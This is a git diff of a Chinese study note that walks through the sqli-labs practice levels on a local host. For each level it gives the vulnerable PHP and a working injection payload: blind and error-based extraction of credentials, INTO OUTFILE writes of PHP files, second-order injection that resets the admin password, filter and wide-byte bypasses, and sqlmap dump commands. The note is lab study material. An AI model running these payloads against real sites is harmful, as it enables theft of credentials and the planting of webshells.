@@ -404,16 +404,15 @@ WAF会自带一些文件白名单，可以利用白名单绕过
 
 ```sql
 /phpmyadmin?name=%27%20union%20select%201,user()--+&submit=1
-
 ```
 
 
 
 ### 2.20 pipline绕过
 
-​	http 协议是由 tcp 协议封装而来，当浏览器发起一个 http 请求时，浏览器先和服务器建立起连接 tcp 连接，然后发送 http 数据包（即我们用burpsuite 截获的数据），其中包含了一个 Connection 字段，一般值为 close，Apache 等容器根据这个字段决定是保持该 tcp 连接或是断开。当发送的内容太大，超过一个http 包容量，需要分多次发送时，值会变成 keep-alive，即本次发起的http 请求所建立的tcp连接不断开，直到所发送内容结束 Connection 为 close 为止。
+​	http协议是由tcp协议封装而来，当浏览器发起一个http请求时，浏览器先和服务器建立起连接tcp连接，然后发送http数据包（即我们用burpsuite截获的数据），其中包含了一个Connection字段，一般值为close，Apache等容器根据这个字段决定是保持该tcp连接或是断开。当发送的内容太大，超过一个http 包容量，需要分多次发送时，值会变成 keep-alive，即本次发起的http 请求所建立的tcp连接不断开，直到所发送内容结束 Connection 为 close 为止。
 
-​	用 burpsuite 抓包提交，复制整个包信息放在第一个包最后，把第一个包close 改成 keep-alive 把 brupsuite 自动更新 Content-Length 勾去掉，有些WAF不会对第一个包的参数进行检测。
+​	用burpsuite抓包提交，复制整个包信息放在第一个包最后，把第一个包close改成keep-alive把brupsuite自动更新Content-Length勾去掉，有些WAF不会对第一个包的参数进行检测。
 
 
 
@@ -527,7 +526,7 @@ $id=$_GET['id'];
 $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
 
 if true
-  	"hahahaha"
+  	"查询结果"
 else 
 	print_r(mysql_error());  
 ```
@@ -594,3 +593,660 @@ sqlmap
 $ python sqlmap.py -u "http://localhost:8888/Less-1/?id=1" --technique=T -v 3 -D security -T users --dump --batch
 ```
 
+#### 3.2.2 Less-2
+
+```php
+$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
+```
+
+闭合方式改变。
+
+#### 3.2.3 Less-3
+
+```php
+$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
+```
+
+闭合方式改变。
+
+#### 3.2.4 Less-4
+
+```php
+$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
+```
+
+闭合方式改变。
+
+#### 3.2.5 Less-5
+
+```php
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+if true
+  	echo 'You are in...........';
+else 
+	print_r(mysql_error());
+```
+
+不支持联合查询。
+
+#### 3.2.6 Less-6
+
+```php
+$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
+if true
+  	echo 'You are in...........';
+else 
+	print_r(mysql_error());
+```
+
+闭合方式不一样。
+
+#### 3.2.7 Less-7
+
+```php
+$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";
+$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
+if true
+  	echo 'You are in.... Use outfile......';
+else 
+	//print_r(mysql_error());
+    echo "You have an error in your SQL syntax";
+```
+
+**布尔盲注**
+
+```sql
+?id=1'))and ascii(substr((select concat(username,password) from users limit 0,1),1,1))>67 %23 //正常回显
+?id=1'))and ascii(substr((select concat(username,password) from users limit 0,1),1,1))>68 %23 //报错
+```
+
+**时间盲注**
+
+```sql
+?id=1'))and if(ascii(substr((select concat(username,password) from users limit 0,1),1,1))>67,1,sleep(5)) %23 //不延时
+?id=1'))and if(ascii(substr((select concat(username,password) from users limit 0,1),1,1))>68,1,sleep(5)) %23 //延时
+```
+
+**outfile**
+
+这里因为提示`Use outfile`，因此可以尝试写文件。
+
+```bash
+$ mysql -e "show global variables like '%secure%';"
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_auth      | OFF   |
+| secure_file_priv |       |
++------------------+-------+
+```
+
+当`secure_file_priv`为`null`时，表示限制`mysql`不允许导入导出。
+
+当`secure_file_priv`为`/tmp`时，表示限制`mysql`只能在`/tmp`目录下导入导出。
+
+当`secure_file_priv`为`空`时，表示限制`mysql`不对导入导出做限制。
+
+这里还需要赋予文件写入的权限
+
+```bash
+$ chmod -R 777 /var/www/html
+```
+
+然后执行sql语句
+
+```sql
+?id=1'))union select * from security.users into outfile "/var/www/html/Less-7/user.txt"%23
+```
+
+![image-20250310220651812](sql注入/image-20250310220651812.png)
+
+这里也可以写入shell
+
+```sql
+?id=1'))union select 1,2,"<?php phpinfo();?>" into outfile "/var/www/html/Less-7/info.php"%23
+```
+
+![image-20250310220934038](sql注入/image-20250310220934038.png)
+
+#### 3.2.8 Less-8
+
+```php
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+if true
+  	echo 'You are in....';
+else 
+	//print_r(mysql_error());
+    //echo "You have an error in your SQL syntax";
+```
+
+闭合方式改变。
+
+#### 3.2.9 Less-9
+
+```php
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+if true
+  	echo 'You are in....';
+else 
+	echo 'You are in....';
+```
+
+只能用延时注入。
+
+#### 3.2.10 Less-10
+
+```php
+$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
+if true
+  	echo 'You are in....';
+else 
+	echo 'You are in....';
+```
+
+闭合方式改变。
+
+#### 3.2.11 Less-11
+
+```php
+$uname=$_POST['uname'];
+$passwd=$_POST['passwd'];
+
+@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
+if true
+  	"查询结果"
+else 
+	print_r(mysql_error());
+```
+
+与Less-1一致。
+
+#### 3.2.12 Less-12
+
+```php
+$uname=$_POST['uname'];
+$passwd=$_POST['passwd'];
+
+@$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";
+if true
+  	"查询结果"
+else 
+	print_r(mysql_error());
+```
+
+闭合方式改变。
+
+#### 3.2.13 Less-13
+
+```php
+$uname=$_POST['uname'];
+$passwd=$_POST['passwd'];
+
+@$sql="SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1";
+if true
+  	//"查询结果"
+else 
+	print_r(mysql_error());	
+```
+
+闭合方式改变，不能用联合查询。
+
+#### 3.2.14 Less-14
+
+```php
+$uname=$_POST['uname'];
+$passwd=$_POST['passwd'];
+
+@$sql="SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1";
+if true
+  	//"查询结果"
+else 
+	print_r(mysql_error());
+```
+
+闭合方式改变。
+
+#### 3.2.15 Less-15
+
+```php
+$uname=$_POST['uname'];
+$passwd=$_POST['passwd'];
+
+@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
+if true
+  	//"查询结果"
+else 
+	//print_r(mysql_error());
+```
+
+闭合方式改变，不能使用报错。
+
+#### 3.2.16 Less-16
+
+```php
+$uname=$_POST['uname'];
+$passwd=$_POST['passwd'];
+
+@$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";
+if true
+  	//"查询结果"
+else 
+	//print_r(mysql_error());
+```
+
+闭合类型改变。
+
+#### 3.2.17 Less-17
+
+```php
+//过滤
+$uname=check_input($_POST['uname']);
+$passwd=$_POST['passwd'];
+
+@$sql="SELECT username, password FROM users WHERE username= $uname LIMIT 0,1";
+
+if true
+    $update="UPDATE users SET password = '$passwd' WHERE username='$row1'";
+	if error
+        print_r(mysql_error());
+```
+
+`uname`被过滤了，只能考虑update这里注入，使用报错注入即可。
+
+#### 3.2.18 Less-18
+
+```php
+$uagent = $_SERVER['HTTP_USER_AGENT'];
+$IP = $_SERVER['REMOTE_ADDR'];
+//uname和passwd被过滤
+$uname = check_input($_POST['uname']);
+$passwd = check_input($_POST['passwd']);
+
+$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
+
+if true
+    $insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
+	echo 'Your User Agent is: ' .$uagent;
+	print_r(mysql_error());	
+else 
+    print_r(mysql_error());
+```
+
+这里`uname`和`passwd`被过滤了，因此只能在insert语句注入。
+
+- `$_SERVER['HTTP_CLIENT_IP']` 客户端可以伪造。
+- `$_SERVER['HTTP_X_FORWARDED_FOR']`，客户端可以伪造。
+- `$_SERVER['REMOTE_ADDR']`，客户端不能伪造。
+
+所以这里只能在`User-Agent`注入。
+
+```sql
+User-Agent: 1'and (select 1 from (select count(*),concat((select concat(username,password) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1
+```
+
+![image-20250310224830354](sql注入/image-20250310224830354.png)
+
+#### 3.2.19 Less-19
+
+```php
+$uagent = $_SERVER['HTTP_REFERER'];
+$IP = $_SERVER['REMOTE_ADDR'];
+//uname和passwd被过滤
+$uname = check_input($_POST['uname']);
+$passwd = check_input($_POST['passwd']);
+
+$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
+
+if true
+    $insert="INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')";
+	echo 'Your Referer is: ' .$uagent;
+	print_r(mysql_error());	
+else 
+    print_r(mysql_error());
+```
+
+`User-Agent`改为了`Referer`。
+
+#### 3.2.20 Less-20
+
+```php
+if(!isset($_COOKIE['uname']))
+    //过滤uname和passwd
+    $uname = check_input($_POST['uname']);
+    $passwd = check_input($_POST['passwd']);
+
+    $sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
+    $cookee = $row1['username'];
+    if true
+        setcookie('uname', $cookee, time()+3600);
+    else:
+        print_r(mysql_error());
+else:
+    if(!isset($_POST['submit']))
+        $cookee = $_COOKIE['uname'];
+
+        $sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";
+        if (!$result)
+            print_r(mysql_error());
+        if($row)
+            "输出查询的信息"
+    else:
+        setcookie('uname', $row1['username'], time()-3600);
+?>
+```
+
+就是从`Cookie`中读取`uname`值，产生注入。
+
+#### 3.2.21 Less-21
+
+```php
+$cookee = base64_decode($cookee);
+$sql="SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1";
+```
+
+只节选了相关代码，其余与`Less-20`大差不差，主要是多了一个base64编码，这里可以用sqlmap脚本。
+
+```bash
+$ python sqlmap.py -u http://127.0.0.1:8888/Less-21/ --cookie="uname=*" --tamper="base64encode" -v 3 -D security -T users --dump --batch
+```
+
+![image-20250310230842396](sql注入/image-20250310230842396.png)
+
+#### 3.2.22 Less-22
+
+```php
+$cookee1 = '"'. $cookee. '"';    
+$sql="SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1";
+```
+
+闭合方式改变
+
+#### 3.2.23 Less-23
+
+```php
+$id=$_GET['id'];
+
+$reg = "/#/";
+$reg1 = "/--/";
+$replace = "";
+$id = preg_replace($reg, $replace, $id);
+$id = preg_replace($reg1, $replace, $id);
+
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+
+if true
+    "查询结果"
+else:
+    print_r(mysql_error());
+```
+
+过滤了注释符，可以使用闭合方式。
+
+#### 3.2.24 Less-24
+
+`login_create.php`
+
+```php
+$username=  mysql_escape_string($_POST['username']) ;
+$pass= mysql_escape_string($_POST['password']);
+$re_pass= mysql_escape_string($_POST['re_password']);
+
+$sql = "select count(*) from users where username='$username'";
+
+if ($pass==$re_pass)
+  $sql = "insert into users ( username, password) values(\"$username\", \"$pass\")";
+```
+
+`login.php`
+
+```php
+$username = mysql_real_escape_string($_POST["login_user"]);
+$password = mysql_real_escape_string($_POST["login_password"]);
+$sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
+```
+
+`pass_change.php`
+
+```php
+$username= $_SESSION["username"];
+$curr_pass= mysql_real_escape_string($_POST['current_password']);
+$pass= mysql_real_escape_string($_POST['password']);
+$re_pass= mysql_real_escape_string($_POST['re_password']);
+
+if($pass==$re_pass)
+    $sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
+```
+
+这里大部分都被转义了，唯一可利用的地方在最后的`update`语句中的`username`，这里需要利用二次注入，即将构造的sql语句插入数据库中，在其被调用时触发。
+
+比如数据库有`username`值为`admin'#`，被拼接进`update`语句就会变成：
+
+```sql
+UPDATE users SET PASSWORD='$pass' where username='admin'#' and password='$curr_pass'
+```
+
+那么就直接修改了`admin`用户的密码。
+
+先注册一个名为`admin'#`的用户
+
+![image-20250310232549937](sql注入/image-20250310232549937.png)
+
+然后登录后修改密码
+
+![image-20250310232652649](sql注入/image-20250310232652649.png)
+
+查看数据库发现`admin`用户密码被成功修改了
+
+```bash
+mysql> select * from security.users;
++----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+|  1 | Dumb     | Dumb       |
+|  2 | Angelina | I-kill-you |
+|  3 | Dummy    | p@ssword   |
+|  4 | secure   | crappy     |
+|  5 | stupid   | stupidity  |
+|  6 | superman | genious    |
+|  7 | batman   | mob!le     |
+|  8 | admin    | 1234       |
+|  9 | admin1   | admin1     |
+| 10 | admin2   | admin2     |
+| 11 | admin3   | admin3     |
+| 12 | dhakkan  | dumbo      |
+| 14 | admin4   | admin4     |
+| 15 | admin'#  | 123        |
++----+----------+------------+
+```
+
+#### 3.2.25 Less-25
+
+接下来很多是绕过过滤的，所以只考虑绕过过滤的部分。
+
+```php
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+
+$id= preg_replace('/or/i',"", $id);    
+$id= preg_replace('/AND/i',"", $id);
+```
+
+双写绕过`oorr`，符号替换`or`换成`||`。
+
+#### 3.2.26 Less-25a
+
+无区别。
+
+#### 3.2.27 Less-26
+
+```php
+$id= preg_replace('/or/i',"", $id);           
+$id= preg_replace('/and/i',"", $id);     
+$id= preg_replace('/[\/\*]/',"", $id);     
+$id= preg_replace('/[--]/',"", $id);    
+$id= preg_replace('/[#]/',"", $id);       
+$id= preg_replace('/[\s]/',"", $id);     
+$id= preg_replace('/[\/\\\\]/',"", $id);    
+```
+
+`or`和`and`使用双写或者`||``&&`替换。
+
+过滤注释使用闭合绕过。
+
+空格字符绕过
+
+`%a0`：空格
+
+`%09`：TAB键（水平）
+
+`%0a`：新建一行
+
+`%0c`：新的一页
+
+`%0d`：return功能
+
+`%0b`：TAB键（垂直）
+
+`%00`：空字符
+
+#### 3.2.28 Less-26a
+
+无区别。
+
+#### 3.2.29 Less-27
+
+```php
+$id= preg_replace('/[\/\*]/',"", $id);
+$id= preg_replace('/[--]/',"", $id);
+$id= preg_replace('/[#]/',"", $id);
+$id= preg_replace('/[ +]/',"", $id);
+$id= preg_replace('/select/m',"", $id);
+$id= preg_replace('/select/s',"", $id);
+$id= preg_replace('/Select/s',"", $id);
+$id= preg_replace('/SELECT/s',"", $id);
+$id= preg_replace('/union/s',"", $id);
+$id= preg_replace('/Union/s',"", $id);
+$id= preg_replace('/UNION/s',"", $id);
+```
+
+`select`和`union`使用大小写绕过和嵌套绕过即可。
+
+#### 3.2.30 Less-27a
+
+无区别。
+
+#### 3.2.31 Less-28
+
+```php
+$id= preg_replace('/[\/\*]/',"", $id);
+$id= preg_replace('/[--]/',"", $id);
+$id= preg_replace('/[#]/',"", $id);
+$id= preg_replace('/[ +]/',"", $id);.
+$id= preg_replace('/union\s+select/i',"", $id);
+```
+
+不能大小写绕过，嵌套绕过即可。
+
+#### 3.2.32 Less-28a
+
+无区别。
+
+#### 3.2.33 Less-29
+
+这里主要难点在`login.php`而不是`index.php`中。
+
+```php
+//提取id
+function java_implimentation($query_string)
+{
+	$q_s = $query_string;
+	$qs_array= explode("&",$q_s);
+	foreach($qs_array as $key => $value)
+	{
+		$val=substr($value,0,2);
+		if($val=="id")
+		{
+			$id_value=substr($value,3,30); 
+			return $id_value;
+			echo "<br>";
+			break;
+		}
+	}
+}
+$qs = $_SERVER['QUERY_STRING'];
+$hint=$qs;
+$id1=java_implimentation($qs);
+$id=$_GET['id'];
+//id只能为数字
+whitelist($id1);
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+```
+
+这里可以构造两个`id`，因为`java_implimentation()`函数只会拿到第一个`id`去检测，从而使得后面`id`绕过检测。
+
+这里根据语言特性绕过可以看本文前面部分。
+
+#### 3.2.34 Less-30
+
+没区别。
+
+#### 3.2.35 Less-31
+
+没区别。
+
+#### 3.2.36 Less-32
+
+```php
+function check_addslashes($string)
+{
+    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);  
+    $string = preg_replace('/\'/i', '\\\'', $string);
+    $string = preg_replace('/\"/', "\\\"", $string);      
+    return $string;
+}
+
+$id=check_addslashes($_GET['id']);
+
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+```
+
+宽字节注入，`%df%5c`被当做一个汉字，使得`'`逃逸。
+
+使用`\`转义`\`，如`\\'`，第二个`\`被转义，使`'`出来。
+
+将 utf-8 转换为 utf-16 或 utf-32，例如将 `'` 转为 utf-16 为`�`
+
+```bash
+$ echo \'|iconv -f utf-8 -t utf-16
+��'
+```
+
+> 这里我的理解是，�在URL编码后为`%EF%BF%BD`，MySQL 在使用 GBK 编码的时候，`%EF%BF`被当做一个汉字，`%BD`与`%5c`也就是`\`被当做一个汉字，因此单引号逃逸出来。
+
+可以让`'`逃逸出来
+
+```sql
+?id=1�'or 1%23
+```
+
+![image-20250311002549978](sql注入/image-20250311002549978.png)
+
+#### 3.2.37 Less-33
+
+没区别。
+
+#### 3.2.38 Less-34
+
+没区别。
+
+#### 3.2.39 Less-35
+
+没区别。
+
+#### 3.2.40 Less-36
+
+没区别
+
+#### 3.2.41 Less-37
+
+没区别。
